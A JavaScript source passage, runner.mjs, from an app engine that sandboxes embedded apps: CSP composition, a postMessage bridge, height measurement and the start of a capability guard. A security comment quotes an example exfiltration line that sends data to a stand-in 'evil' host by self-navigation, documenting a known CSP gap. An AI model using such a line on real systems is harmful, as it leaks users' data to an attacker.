// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 2nd1st
// runner.mjs — THE enforcement piece for sandboxed app children (write-set D).
//
// Before this module there were three hand-kept copies of the same machine — the loader's
// mount branch (then `runnerMount` in shell.mjs), the settings app's thumbnail bridge, the
// settings app's drawer bridge — plus the App Store app's inert stub as a fourth variant, and
// they had measurably drifted (three divergent rules found in the write-set D survey; none of
// those names exists any more). Every future gap between copies is a
// cross-app escape seam (adversarial review F2: "one missing line = escape"), so the machine
// now exists ONCE: document composition (CSP-first), the child mini-bridge, and the caps
// chokepoint live here, parameterized by a PRESET instead of re-implemented per consumer.
//
//   preset "live"      caps-driven read/write (the loader, oma.embed, settings' drawer)
//   preset "inert"     zero host IO — snapshot/fixture-fed (App Store previews)
//
// NOT a security boundary against the EMBEDDER (it runs in the embedder's document); it is
// the boundary around the CHILD: sandbox="allow-scripts" (no allow-same-origin) makes the
// child an opaque origin whose only working channel is postMessage to the embedder document,
// and every call funnels through the guard built by makeGuard() — the single chokepoint
// where caps are enforced (docs/security-model.md §2.3, §4.2b).
//
// Consumed by: shell-runtime.js (oma.embed + the loader path — bundled into dist/shell.js),
// and exported through index.mjs for embedding shells (the hosted /library preview) so no
// out-of-repo mirror has to exist.

import { isControlPlaneTool, DATA_WRITE_TOOLS as DATA_WRITE_LIST, DATA_BATCH_REFUSAL } from "./tool-policy.mjs";
import { viaOf, sansRequestState, withConfirmation, RUNTIME_CONTRACT } from "./runtime-core.mjs";

// CSP goes FIRST in the child head: no network REQUESTS (connect-src 'none', no remote
// script/img/font sources) — that closes fetch/XHR/img/font/frame egress on every host, incl.
// the browser viewer.
//
// 🔴 It does NOT close exfiltration, and until 2026-07-31 these lines claimed it did — flatly,
// and for every host. (The superseded sentence is quoted in full in the ledger, stopgap SG-22.
// It is deliberately NOT quoted here: SG-22's removal criterion is a grep for that sentence, and
// a correction that reproduces the words it corrects keeps the criterion red forever. A test you
// can never satisfy is a test people learn to skip — the same trap that let a doc-facts exemption
// go stale, where writing "this exemption never matched" was itself enough to make it match.)
// CSP has no directive governing a document navigating
// ITSELF, and `sandbox="allow-scripts"` withholds top/ancestor navigation, not self-navigation:
// `location.href = "https://evil/?d=" + data` still leaves. Measured 2026-07-31 in Chrome 150
// against this exact CSP — fetch blocked, img blocked, the navigation carried the payload.
// Repro: `node test/rig-sandbox-exfil.mjs`. The authoritative account is the self-navigation
// section of docs/security-model.md, which had this right all along while these lines did not.
//
// Worth reading the paragraph below with that in mind: it reasons correctly that `form-action`
// is a NAVIGATION and therefore misses `default-src` — the same reasoning applies to
// `location.href`, and simply was not carried across. Closing that one is a design job (a real
// fix needs host support or a `navigate-to`-shaped capability), deliberately not this version.
// The bare POLICY string is exported separately so a server that serves preview documents
// can send the same policy as an HTTP header (the authoritative copy; the meta is self-defence).
//
// `form-action` is listed EXPLICITLY because it is the one outbound shape that does NOT fall
// back to `default-src`: a form posting to an attacker's URL is a navigation, not a fetch, so
// every other directive here misses it. It is now the PRIMARY wall on that channel, and the
// depth it was written for is what let the wall move: the sandbox used to withhold `allow-forms`
// as well, and 2026-08-15 measured what that attribute was really costing — Chrome refuses a
// sandboxed form BEFORE dispatching `submit`, so withholding it did not just block the POST, it
// deleted the event every app's `onsubmit` handler is built on. The attribute is granted now
// (shell-runtime.js, oma.embed) and the channel stands on three walls that each block the
// SUBMISSION while leaving the EVENT alone: this directive, the embedder's `frame-src 'none'`,
// and the bridge's unconditional cancel (BRIDGE below). Both new walls were measured on the same
// day against a form posting to an off-site action: each one blocked it on its own.
export const RUNNER_CSP_POLICY = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; script-src 'unsafe-inline'; connect-src 'none'; frame-src 'none'; form-action 'none'";
export const RUNNER_CSP = '<meta http-equiv="Content-Security-Policy" content="' + RUNNER_CSP_POLICY + '">';

/** Measure natural app content instead of the iframe viewport. Chromium keeps
 * documentElement.scrollHeight at least as tall as the viewport, so feeding that value back
 * into the iframe makes a filtered/tabbed app unable to shrink and leaves a large blank tail. */
export function measureNaturalBodyHeight(body, viewportHeight) {
  if (!body) return Math.max(0, Math.ceil(Number(viewportHeight) || 0));

  const bodyRect = body.getBoundingClientRect();
  const children = body.children || [];
  let firstTop = Number.POSITIVE_INFINITY;
  let lastBottom = Number.NEGATIVE_INFINITY;
  let measured = 0;

  for (let index = 0; index < children.length; index += 1) {
    const element = children[index];
    const tag = String(element?.tagName || "").toUpperCase();
    if (tag === "SCRIPT" || tag === "STYLE" || tag === "LINK" || tag === "META" || tag === "TITLE") continue;
    if (!element || typeof element.getBoundingClientRect !== "function") continue;

    const rect = element.getBoundingClientRect();
    if (!(rect.width > 0 || rect.height > 0)) continue;
    firstTop = Math.min(firstTop, rect.top - bodyRect.top);
    lastBottom = Math.max(lastBottom, rect.bottom - bodyRect.top);
    measured += 1;
  }

  const bodyHeight = Number(body.scrollHeight) || 0;
  const childExtent = measured
    ? Math.max(0, lastBottom) + Math.max(0, firstTop)
    : bodyHeight;
  const viewport = Number(viewportHeight) || 0;
  const naturalHeight = bodyHeight > viewport + 1
    ? Math.max(childExtent, bodyHeight)
    : childExtent;
  return Math.max(0, Math.ceil(naturalHeight));
}

/** The ONE height bound — and it binds only where the ENGINE ITSELF is the embedder.
 *
 *  One message carries it: `omaRunHeight`, posted by a sandboxed child to the document that mounted
 *  it (oma.embed's frames, the store's inert previews). A CHAT host never reads that message —
 *  measured on Leo's claude.ai (2026-08-13, wire capture): the thing that reports a widget's height
 *  is a shim the HOST injects inside the iframe, posting `ui/notifications/size-changed`, and
 *  `grep size-changed` over this repo is empty. So nothing here decides how tall a widget in a
 *  conversation may be. That is the host's own published limit, and as of 2026-08-14 (Leo's call)
 *  the engine has no second opinion to add — see unpinDocumentHeight for what it does instead.
 *
 *  `window.screen.height` is the DEVICE screen, not the frame or the window — a sandboxed child
 *  can read it, and it is the only bound available that does not feed back on itself (the FRAME's
 *  height is the number the embedder derived from us, so measuring against it is a loop). A hostile
 *  or absent reading (0, NaN, a stub) must never collapse a widget, so a bad number means NO BOUND
 *  at all; an implausibly small one is floored at 320, which no real device is below.
 *
 *  Returns 0 for "unbounded" — the caller below reads that as "change nothing". */
export function screenHeightCap(screenHeight) {
  const screen = Math.ceil(Number(screenHeight) || 0);
  if (!(screen > 0)) return 0;
  return Math.max(screen, 320);
}

/** Cap what a child ASKS ITS EMBEDDER for, at the device's own screen height.
 *
 *  measureNaturalBodyHeight answers "how tall is this app", and handing that number to an embedder
 *  unmodified means an app-store front page thousands of pixels tall gets a frame thousands of
 *  pixels tall, inside a page the reader then has to scroll past. Nothing is lost by bounding it:
 *  the app keeps its own scrolling, and every embedder here already clamps into its own [min,max]
 *  on top of this. Only the engine's own embedders ever receive this — see screenHeightCap. */
export function capBroadcastHeight(naturalHeight, screenHeight) {
  const h = Math.max(0, Math.ceil(Number(naturalHeight) || 0));
  const cap = screenHeightCap(screenHeight);
  return cap > 0 ? Math.min(h, cap) : h;          // unreadable screen ⇒ report the natural height
}

/** UNPIN the document, so that whoever measures it measures the CONTENT.
 *
 *  🔴 Our postMessage is not the channel a chat host listens on. Measured on Leo's claude.ai
 *  (2026-08-13, wire capture): the host injects its OWN shim inside the widget iframe and that shim
 *  posts `ui/notifications/size-changed {width, height}` — `grep size-changed` over this repo is
 *  empty, i.e. the reporter is not our code and never will be. It reads the document's own
 *  scrollHeight and it re-reports (755 → 1004 → 755 captured on one app). So the only lever we
 *  hold over what a host does with our height is THE DOM IT MEASURES.
 *
 *  WHAT THAT LEVER IS FOR is the part this file got wrong once. For one day (2026-08-13 → 08-14) it
 *  also carried a CAP: max-height at the screen bound, `overflow-y:auto`, the native scrollbar
 *  hidden and an overlay thumb drawn in its place, so that a tall app could not bury the
 *  conversation. It bought that with a scroll trap — `body` became the scroll container, and on a
 *  phone the app's own scrolling stopped working outright. Leo's call, 2026-08-14: infinite height,
 *  the host's official limit decides. Every host that embeds widgets publishes one; ours was a
 *  second, worse limit drawn on top of it, and the whole cap machine is gone.
 *
 *  WHAT REMAINS is the half that limits nothing — the app has to be MEASURABLE at all.
 *  `overflow:hidden` on html and/or body (SEVEN of the 24 shipped apps: habit-streaks,
 *  hydration-tally, keep-in-touch, meal-planner, spending-journal on both boxes; event-countdowns
 *  and savings-goals on the body) or `body{min-height:100vh}` (dashboard) turn the document's
 *  measured height into the FRAME's height — which the host set from its own last reading — so the
 *  number freezes at whatever it already was and adding a row changes nothing. That is the
 *  habit-streaks bug Leo reported at its root, and no amount of watching more elements fixes it,
 *  because the number being read is not about the content at all. `height:auto` + `min-height:0` on
 *  both boxes is the whole of the fix: an inner `height:100%` pane resolves against an auto-height
 *  body and grows with its content again.
 *
 *  `overflow-y:visible` is the third declaration, and it is a REPEAL of the cap's `auto` rather than
 *  a leftover of it. A body with `overflow-y:auto` and no max-height is a scroll container that can
 *  never scroll, and `position:sticky` binds to the nearest ancestor whose overflow is not visible:
 *  the store's and settings' capsule bars would stick to that dead box and never reach the top of
 *  the frame in the one case where an app still scrolls inside itself — a host that clamps the frame
 *  shorter than the content (ChatGPT desktop). `visible` is also what the seven pinned apps need
 *  from us, since with an auto height there is no overflow at the body to hide.
 *
 *  Inline + `!important` because these are the app's OWN declarations we are overriding, and an
 *  app's stylesheet rule beats a plain inline value it wrote deliberately (`html,body{...!important}`
 *  exists in the wild). Inline declarations also survive the loader's wholesale `body.innerHTML`
 *  rewrites — which is why this runs once, early, and then stays. */
export function unpinDocumentHeight() {
  var body = document.body, root = document.documentElement;
  if (!body) return false;
  var unpin = function (el) {
    if (!el || !el.style) return;
    el.style.setProperty("height", "auto", "important");
    el.style.setProperty("min-height", "0", "important");
    el.style.setProperty("overflow-y", "visible", "important");
  };
  unpin(root);
  unpin(body);
  return true;
}


/** Install the height watcher. Injected by toString into both child documents, so read it as
 *  browser source: no imports, no closures over this module, ES5-shaped for the CSP'd child.
 *
 *  Observing `document.body` ALONE is the bug this replaces. A widget iframe has a height its
 *  embedder set, and inside it the body box is frequently pinned — by that viewport, by an app
 *  that writes `html,body{overflow:hidden}`, by a root element that is the only thing which
 *  actually grows. Adding a row then changes what is on screen without changing the one box we
 *  were watching, so nothing was re-measured and the frame never grew; a whole-page re-render
 *  (a filter change, a tab switch) resized the body and looked like it worked, which is exactly
 *  the shape Leo measured — habit-streaks stuck on insert, the App Store fine on category change.
 *  So: watch the body AND each of its direct children, and re-attach when that child list changes
 *  (an app that rewrites body.innerHTML replaces every element we were holding). */
export function watchNaturalHeight(report) {
  var timer = 0, watched = [], ro = null;
  var ping = function () { clearTimeout(timer); timer = setTimeout(report, 50); };   // coalesce a burst
  var rewatch = function () {
    var body = document.body;
    if (!ro || !body) return;
    for (var i = 0; i < watched.length; i++) { try { ro.unobserve(watched[i]); } catch (e) { /* gone */ } }
    watched = [body];
    for (var c = body.firstElementChild; c; c = c.nextElementSibling) watched.push(c);
    for (var j = 0; j < watched.length; j++) { try { ro.observe(watched[j]); } catch (e) { /* gone */ } }
  };
  var start = function () {
    if (!document.body) return;
    if (typeof ResizeObserver === "function") {
      ro = new ResizeObserver(ping);
      rewatch();
      if (typeof MutationObserver === "function") {
        new MutationObserver(function () { rewatch(); ping(); }).observe(document.body, { childList: true });
      }
    }
    report();   // first paint answers immediately — the debounce is for what comes after
  };
  if (document.readyState === "complete") start();
  else window.addEventListener("load", start);
}

/** The unpin as an INJECTABLE SOURCE — the one copy every document we compose carries.
 *
 *  It shipped first inside the height-broadcast source, which reaches exactly the two documents
 *  that broadcast: the sandboxed bridge child and the inert preview. Measured on Leo's claude.ai
 *  (2026-08-13) that is not where the problem lives — a chat host's TOP-LEVEL widget document is
 *  composed by shell.mjs (wrapLoader for the universal opener, wrapApp for a per-app resource),
 *  neither of which broadcasts anything, and a pinned app there stayed unmeasurable. Broadcasting
 *  and being-measured are two different jobs: only some documents report a height, but EVERY
 *  document a host measures has to be honest about its own. So the unpin is its own export, and
 *  shell.mjs injects this string rather than keeping a second copy of it.
 *
 *  Every injected document wraps this in an IIFE, so the names below are locals, not globals an
 *  app could collide with.
 *
 *  ONLY WHEN SOMEONE ELSE OWNS OUR FRAME AND DERIVES IT FROM OUR CONTENT. A document that nobody
 *  measures has nothing to gain from being unpinned and a layout to lose, and two different
 *  documents are in that position, needing two different tests — because "is anyone embedding me"
 *  and "does that embedder size me from my content" are not the same question:
 *
 *  1. `parent === window` — no embedder at all. /view is a top-level browser page whose viewer
 *     stage already styles `body`. Needs no cross-origin access to evaluate.
 *  2. `window.__OMA_STANDALONE__` — an embedder that is a SHELL, not a measuring host. A shell
 *     hands us a viewport-fixed frame and expects the app to lay itself out and scroll INSIDE it;
 *     it never reads our scrollHeight, and an app written to fill that frame (`height:100%` down
 *     the tree) is doing exactly what the shell asked of it. Rewriting html/body's height there
 *     answers a question nobody asked. The marker is set by shell.mjs (wrapApp/wrapLoader) for
 *     exactly the browser-viewer/hosted-shell configs, and it is emitted BEFORE this script, so it
 *     is readable here.
 *
 *  A chat host is neither: no standalone config (shell.mjs composes it without one) and a real
 *  embedder that sizes the widget from what its own shim reads. Same for the runner's own children
 *  (bridge, inert preview): they are built from THIS module's source, never carry
 *  `__OMA_STANDALONE__`, and stay unpinned. */
export const SELF_HEIGHT_UNPIN_SOURCE =
  "var omaUnpin=" + unpinDocumentHeight.toString() + ";" +
  "var omaUnpinNow=function(){try{if(window.parent===window)return;" +
  "if(window.__OMA_STANDALONE__)return;omaUnpin()}catch(e){}};" +
  // The unpin has to be in place BEFORE anyone else measures. A host's own reporter re-reads on
  // mutation, but a PINNED app never gives it a different number to read — the frame it already
  // set is the answer, forever — so an app that renders before the unpin lands can be frozen at
  // its first size for the rest of its life. Unpinning the moment a body exists closes that
  // window: parse time in the preview document (the script sits after the body) and
  // DOMContentLoaded in the bridge and the two shell documents (they sit in the head, and in the
  // loader's case the app markup arrives long after — the declarations are inline `!important` on
  // html/body, which an innerHTML swap does not touch, so once is enough).
  "if(document.body)omaUnpinNow();else document.addEventListener(\"DOMContentLoaded\",omaUnpinNow);";

/** The same source as a ready-to-embed classic script tag — for a composer that is building an
 *  HTML document rather than a source blob (shell.mjs). Classic, not a module: a module is
 *  deferred, and "as soon as a body exists" is the entire point. */
export const SELF_HEIGHT_UNPIN_SCRIPT =
  '<scr' + 'ipt data-oma="height-unpin">(function(){' + SELF_HEIGHT_UNPIN_SOURCE + "})();</scr" + "ipt>";

// ONE height machine, injected into both child documents (the live bridge and the inert preview).
// They used to hand-roll a broadcast each and had already drifted — only one of them survived a
// host that rejects postMessage, only one of them reported at all without ResizeObserver.
//
// `screenHeightCap` travels WITH the broadcast because capBroadcastHeight's body calls it, and it
// belongs here rather than in the unpin source because the bound only exists for the message below.
//
// It is declared under the name the function HAS AT RUNTIME, not the one written above — and that
// is the whole fix for a bug that shipped in 0.5.0. `capBroadcastHeight.toString()` is injected
// verbatim, so its body calls its sibling by whatever name the BUNDLER left there: in dist/shell.js
// (minify: true) both are two letters, and declaring the helper as the literal `screenHeightCap`
// left every child calling an `Eh` that exists only back in the bundle. A ReferenceError — inside
// omaSendHeight's catch, so it was perfectly silent — and the consequence was that no sandboxed
// child EVER reported a height: every embed sat at the initial 140px for the life of the page
// (measured in Chrome, 2026-08-14). Nothing here could see it, because everything here reads the
// SOURCE module, where the two names already agree. Reading .name makes them agree in both worlds.
const HEIGHT_BROADCAST_SOURCE =
  SELF_HEIGHT_UNPIN_SOURCE +
  "var " + screenHeightCap.name + "=" + screenHeightCap.toString() + ";" +
  "var omaNaturalHeight=" + measureNaturalBodyHeight.toString() + ";" +
  "var omaCapHeight=" + capBroadcastHeight.toString() + ";" +
  "var omaWatchHeight=" + watchNaturalHeight.toString() + ";" +
  "var omaSendHeight=function(){try{parent.postMessage({omaRunHeight:true," +
  'h:omaCapHeight(omaNaturalHeight(document.body,window.innerHeight),(window.screen||{}).height)},"*")}catch(e){}};';

// The child is a separate document, so host-injected design tokens don't reach it. Read the
// COMPUTED values from the embedder document's root and re-emit them as :root CSS for the
// child (the pattern the settings app proved, now the only copy).
export const TOKEN_NAMES = [
  ...["background", "text", "border"].flatMap((k) => ["primary", "secondary", "tertiary", "inverse", "ghost", "info", "danger", "success", "warning", "disabled"].map((v) => "--color-" + k + "-" + v)),
  ...["primary", "secondary", "inverse", "info", "danger", "success", "warning"].map((v) => "--color-ring-" + v),
  "--font-sans", "--font-mono", "--font-weight-normal", "--font-weight-medium", "--font-weight-semibold", "--font-weight-bold",
  ...["xs", "sm", "md", "lg"].flatMap((s) => ["--font-text-" + s + "-size", "--font-text-" + s + "-line-height"]),
  ...["xs", "sm", "md", "lg", "xl", "2xl", "3xl"].flatMap((s) => ["--font-heading-" + s + "-size", "--font-heading-" + s + "-line-height"]),
  ...["xs", "sm", "md", "lg", "xl", "full"].map((s) => "--border-radius-" + s),
  "--border-width-regular", "--shadow-hairline", "--shadow-xs", "--shadow-sm", "--shadow-md", "--shadow-lg",
];

/** The system UI kit as a head <style>. ONE definition of the tag, shared by every composer
 *  (this file's two, plus shell.mjs's wrapApp/wrapLoader) so the data-oma marker that
 *  identifies it — and that shell-runtime reads it back by — cannot drift between them.
 *  The CSS text itself is supplied by the caller: it lives in components/_system.css (MIT)
 *  and only a node-side reader (shell.mjs KIT_CSS) can reach the file. */
export function kitStyle(css) {
  return css ? '<style data-oma="kit">' + css + "</style>" : "";
}

/** :root token style computed from a live document (browser-only caller).
 *
 *  `substitute` repairs a scope leak inherent to reading COMPUTED values: the embedder's own
 *  per-app theme is stamped as inline custom properties on its <html>, so it is part of what
 *  getComputedStyle reports — and copying that into the child baked one app's private theme into
 *  every app it embeds (reproduced: a token scoped to `settings` tinted all eight of its
 *  thumbnails). The embedder passes {name: valueBelowTheTheme | null}; null means "emit nothing
 *  for this one", leaving the child's own fallback layer to answer. The child's LEGITIMATE theme
 *  arrives separately, through the themeVars push, already merged for the child. */
export function tokenCSS(doc, substitute) {
  const cs = doc.defaultView.getComputedStyle(doc.documentElement);
  const has = (n) => substitute && Object.prototype.hasOwnProperty.call(substitute, n);
  let vars = "";
  for (const n of TOKEN_NAMES) {
    if (has(n) && substitute[n] == null) continue;
    const v = String(has(n) ? substitute[n] : cs.getPropertyValue(n)).trim();
    if (v) vars += n + ":" + v + ";";
  }
  return '<style data-oma="tokens">:root{' + vars + "}html{color-scheme:" + (cs.colorScheme || "light dark") + '}body{font-family:var(--font-sans);color:var(--color-text-primary)}</style>';
}

// Mini-bridge injected into the sandboxed child: exposes the window.oma surface and proxies
// every call over postMessage (message keys omaRun*). This is the CHILD half of the machine;
// the guard below is the parent half. Kept as one string so the whole child-facing API has
// one definition. The closing tag is split so this file can travel inside HTML safely.
export const BRIDGE = [
  "<script>(function(){",
  'var S={collection:null,items:[],version:0,app:null,host:null},TI={};',
  'var readyCbs=[],changeCbs=[],prefCbs=[],isReady=false,seq=0,pending={},P=null,urlCache={},TA=[];',
  // coercePref mirrors runtime-core semantics: the FALLBACK's type drives coercion.
  'function coercePref(v,f){var t=typeof f;',
  'if(t==="boolean"){if(v===true||v==="true"||v===1)return true;if(v===false||v==="false"||v===0)return false;return f;}',
  'if(t==="number"){if(typeof v==="number"&&Number.isFinite(v))return v;if(typeof v==="string"&&v.trim()!==""&&Number.isFinite(Number(v)))return Number(v);if(typeof v==="boolean")return v?1:0;return f;}',
  'if(t==="string"){if(typeof v==="string")return v;if(typeof v==="number"||typeof v==="boolean")return String(v);return f;}',
  'return v===undefined?f:v;}',
  'function firePref(k,v,o,s){prefCbs.forEach(function(cb){try{cb({key:k,value:v,oldValue:o,scope:s})}catch(e){}})}',
  'function req(m,a){return new Promise(function(res,rej){var id=++seq;pending[id]=[res,rej];parent.postMessage({omaRun:true,id:id,method:m,args:a},"*");})}',
  // SOURCE-AUTHENTICATED, both halves. The parent already refused messages that aren't from
  // its own child; without the mirror image here a hostile sibling could walk parent.frames[],
  // hold another child's WindowProxy, and postMessage it a forged omaRunSnapshot (rewriting its
  // projection) or an early omaRunResult (resolving its pending request with attacker data).
  // `parent` is the ONLY legitimate peer a sandboxed child ever has.
  'window.addEventListener("message",function(ev){if(ev.source!==parent)return;var d=ev.data||{};',
  'if(d.omaRunResult&&pending[d.id]){var p=pending[d.id];delete pending[d.id];d.error?p[1](new Error(d.error)):p[0](d.result);}',
  'if(d.omaRunSnapshot&&d.snapshot){',
  'if(d.toolInput)TI=d.toolInput;',
  // User theme layer, already merged and charset-checked by the parent (runtime-core themeVars):
  // apply verbatim as inline custom properties, and restore anything dropped since the last push
  // to the token <style> underneath. No rule is re-implemented here — only the assignment.
  'if(d.themeVars){var TV=d.themeVars,st=document.documentElement.style,ti,tk={};',
  'for(ti=0;ti<TV.length;ti++){st.setProperty(TV[ti][0],TV[ti][1]);tk[TV[ti][0]]=1;}',
  'for(ti=0;ti<TA.length;ti++)if(!tk[TA[ti]])st.removeProperty(TA[ti]);',
  'TA=Object.keys(tk);}',
  'var pc=false;',
  'if(d.prefs&&typeof d.prefs==="object"){var CK=d.compKeys||{};',
  'if(P===null){P=d.prefs;}',
  'else{var old=P;P=d.prefs;var k;',
  'for(k in P)if(!(k in old)||old[k]!==P[k]){firePref(k,P[k],old[k],CK[k]?"app":"global");pc=true;}',
  'for(k in old)if(!(k in P)){firePref(k,undefined,old[k],"global");pc=true;}}}',
  // Item count is part of "changed" (the zero-row-open lesson, write-set C): a fresh walk can
  // share a version with an earlier empty push, and eating that repaint leaves the child blank.
  'var ch=d.changed===true||d.snapshot.version!==S.version||d.snapshot.items.length!==S.items.length||pc;S=Object.assign(S,d.snapshot);',
  'if(!isReady){isReady=true;readyCbs.splice(0).forEach(function(cb){try{cb(S)}catch(e){}});}',
  'else if(ch){changeCbs.forEach(function(cb){try{cb(S)}catch(e){}});}}',
  "});",
  // The SUBMISSION is never the app's to make; the EVENT always is. `allow-forms` on the frame
  // (shell-runtime.js oma.embed) exists only so `submit` gets dispatched at all — Chrome refuses a
  // sandboxed form before dispatch, which deleted the event every `onsubmit` handler in the
  // library is built on. Nothing downstream of that handler may leave this document, so the
  // default action is cancelled unconditionally here: an app that simply FORGOT `preventDefault()`
  // then behaves exactly as it did while the attribute was withheld — nothing happens — instead of
  // navigating its own frame to a CSP-blocked page and blanking the widget on screen.
  // This is a listener on `document`, and `submit` bubbles: the app's own handler on the form is
  // the TARGET phase and has already run by the time this fires. No stopPropagation — a delegated
  // handler on document further down the list still receives the event, just not the navigation.
  'document.addEventListener("submit",function(e){e.preventDefault();});',
  'function b64bytes(b){var s=atob(b),u=new Uint8Array(s.length);for(var i=0;i<s.length;i++)u[i]=s.charCodeAt(i);return u;}',
  'window.oma={ get state(){return S}, ready:function(cb){isReady?cb(S):readyCbs.push(cb)}, onChange:function(cb){changeCbs.push(cb)},',
  'addItem:function(o){return req("addItem",o||{})}, updateItem:function(id,f){return req("updateItem",{id:id,fields:f})},',
  'moveItem:function(id,g,p){return req("moveItem",{id:id,group:g,position:p})}, deleteItem:function(id){return req("deleteItem",{id:id})},',
  'refresh:function(){return req("refresh",{})}, callTool:function(n,a){return req("callTool",{name:n,args:a})},',
  'readCollection:function(c){return req("readCollection",{collection:c})},',
  'files:{ list:function(){return req("filesList",{})},',
  'read:function(p){return req("filesRead",{path:p}).then(function(r){return b64bytes(r.base64)})},',
  'url:function(p){if(urlCache[p])return Promise.resolve(urlCache[p]);return req("filesRead",{path:p}).then(function(r){var u=URL.createObjectURL(new Blob([b64bytes(r.base64)],{type:r.mime||"application/octet-stream"}));urlCache[p]=u;return u;})} },',
  'pref:function(k,f){return (P&&k in P)?coercePref(P[k],f):f},',
  'onPrefChange:function(cb){prefCbs.push(cb)},',
  'setPref:function(k,v){return req("setPref",{key:k,value:v})},',
  'sendMessage:function(t){return req("sendMessage",{text:t})},',
  // Rides the generic callTool door so the guard's shaping (callee/via/actor forced to SELF)
  // fires exactly as it does for a hand-rolled call — the typed verb adds no second policy path.
  'callFunction:function(f,a){var q={function:String(f)};if(a!=null)q.args=a;return req("callTool",{name:"call_function",args:q}).then(function(r){return (r&&r.structuredContent)||null;})},',
  // Same contract number the direct runtime reports — the whole point of oma.contract is that an
  // app cannot tell which runtime it landed in by reading it, only which VOCABULARY it may use.
  'get contract(){return ' + RUNTIME_CONTRACT + '},',
  // THE PARENT'S CONTEXT, INHERITED. An app reads `oma.standalone` to answer one question — am I
  // a card in someone's conversation, or do I own a screen — and the answer for a child is the
  // answer for the document it was mounted into: a wall at /view is a screen, and the app the
  // `@live` brick hangs there owns every pixel of its region. Hard-coded `false` said "you are in
  // a chat" to an app standing on a display, so the kit drew it the card the stage contract exists
  // to prevent (components/_system.css `body:not(.standalone)`). Read LAZILY off the global rather
  // than captured into a local: the flag script and this one then have no ordering contract at all.
  // The name is deliberately NOT `__OMA_STANDALONE__` — that global means "a shell frames me,
  // don't unpin my height" (SELF_HEIGHT_UNPIN_SOURCE), and a runner child IS measured by its
  // parent (omaRunHeight), so borrowing that name would silently freeze every child's height.
  'get toolInput(){return TI}, get standalone(){return !!window.__OMA_CHILD_SA__} };',
  HEIGHT_BROADCAST_SOURCE,
  "omaWatchHeight(omaSendHeight);",
  "})();</scr" + "ipt>",
].join("\n");

/** Child document composition. WE build the outer document — the app's own <head> is
 *  NEVER trusted as an injection anchor: anchoring on it lets a hostile app emit a
 *  <script> BEFORE its <head>, which per HTML parsing runs before an injected CSP meta is
 *  parsed, so its network egress escapes the policy entirely (reproduced in Chrome). The
 *  untrusted markup goes wholesale inside OUR <body>: its doctype/head degrade to tag-soup,
 *  its scripts still execute — but only AFTER the CSP (the FIRST element of OUR <head>).
 *
 *  `standalone` is the EMBEDDER's own context, handed down (the bridge's `oma.standalone`). It is
 *  written only when true, so a chat-side child stays byte-identical to the document this composed
 *  before the option existed. */
export function composeChildDoc(html, { tokenCss = "", kitCss = "", fallbackCss = "", bridge = BRIDGE, standalone = false } = {}) {
  // Layer order is the cascade: neutral fallbacks, then the embedder's (substituted) tokens, then
  // the kit, then the app's own markup and <style>. The child's THEME arrives at runtime as
  // inline custom properties on its <html>, which outrank all of these — same as in the parent.
  return "<!doctype html><html><head>" + RUNNER_CSP + '<meta charset="utf-8">' +
    (fallbackCss ? '<style data-oma="token-fallback">' + fallbackCss + "</style>" : "") +
    tokenCss + kitStyle(kitCss) +
    (standalone ? '<scr' + 'ipt data-oma="child-context">window.__OMA_CHILD_SA__=1;</scr' + "ipt>" : "") +
    bridge + "</head><body>" + html + "</body></html>";
}

// (The per-iframe sliding-window rate limiter — RATES/stamps/rate() — retired 2026-08-04,
// elegance A9. Its thresholds were self-described "research thresholds", every mounted child
// is local/trusted today, and its ONLY measured activation throttled a legitimate dashboard
// preview. If abuse is ever measured, the quota belongs server-side, keyed by an observed
// principal and workload — not in per-mount counters an attacker gets a fresh copy of per iframe.)

// Tool-name families the guard routes by. The data-write membership comes from tool-policy
// (ONE list with the direct runtime's stamping set); the file families gate on file caps with
// app binding.
const DATA_WRITE_TOOLS = new Set(DATA_WRITE_LIST);
const FILE_READ_TOOLS = new Set(["file_read", "file_list"]);
const FILE_WRITE_TOOLS = new Set(["file_write", "file_write_begin", "file_write_chunk", "file_write_commit", "file_delete"]);
const FILE_BIND_TOOLS = new Set(["file_write", "file_write_begin", "file_delete"]);   // carry `app` — forced to the caller
// The chunked family carries NO app, only an upload_id, so there is nothing to force:
// binding has to be by WHICH ids this guard opened (see myUploads in makeGuard). They were
// previously assumed to "inherit begin's binding", which is not a thing the wire supports.
const UPLOAD_ID_TOOLS = new Set(["file_write_chunk", "file_write_commit"]);

// ---- reserved boundaries (W4, redesign §8 R2/R4 — recorded, deliberately NOT built) --------
//
// R4 · standard-form inner bridge + `oma.mcp` escape hatch: the omaRun* subprotocol above is
// the seam where an MCP-framed adapter would sit if the child↔parent wire ever needs to speak
// standard shapes — makeGuard stays the policy authority either way (the ruling's own words).
// Neither is built today, for the A10 reason (a public method that can only fail is a broken
// promise): every transport this engine serves carries TOOL calls only, so an `oma.mcp`
// protocol-method hatch would have nothing to reach. It becomes buildable when a protocol
// surface exists behind it (W3 functions / resources); its admission guardrails are already
// ruled (redesign §8 R4: only where no high-level oma method exists · same guard + caps ·
// never taught in the GUIDE · ≥3 apps using one shape triggers promotion review).
//
// R2 · App-Provided Tools: if a view ever registers tools with the host, the registration
// funnels through THIS guard (mount-scoped names, teardown-on-unmount, view-local state only —
// persistent semantics keep their single call_function chokepoint). Gated on the §8-R2
// predicates (standard transport + lifecycle green on real hosts + zero stale-tool calls +
// measured prompt-cache cost) — none measured yet, so this is a named seam, not a feature.

/**
 * Build the parent-side chokepoint. Every child call — typed method or generic callTool —
 * funnels through the returned async guard(method, args). Throws (or returns an isError
 * result) on refusal; the mount layer relays either to the child.
 *
 * cfg:
 *   name       child app name (the binding target for collection/file/function forcing)
 *   coll       bound collection
 *   caps       engine-computed caps (absent fields mean DENY — strictest)
 *   tier       child tier ("local" | ...)
 *   preset     "live" | "inert"
 *   io         { callTool, sendMessage, snapshot, settingsIds, readCollection,
 *                readFile(app, path) → {base64, mime}, notify, requestConfirm, uuid } — ALL
 *                effects go through io, so the whole policy is node-testable with fakes.
 */
export function makeGuard(cfg) {
  const { name, coll, preset = "live", tier, io } = cfg;
  const caps = cfg.caps || {};
  const callAllow = Array.isArray(caps.call_tools) ? caps.call_tools : [];
  // "*" bypasses only the tool-NAME allowlist (the engine's local-tier passthrough marker);
  // the explicit deny caps below still apply.
  const wildcard = callAllow.indexOf("*") !== -1;
  const uuid = io.uuid || (() => (globalThis.crypto?.randomUUID ? crypto.randomUUID() : String(Date.now()) + Math.random()));
  const snap = () => io.snapshot() || { collection: coll, items: [], version: 0 };
  const notify = (m) => { try { io.notify && io.notify(m); } catch {} };

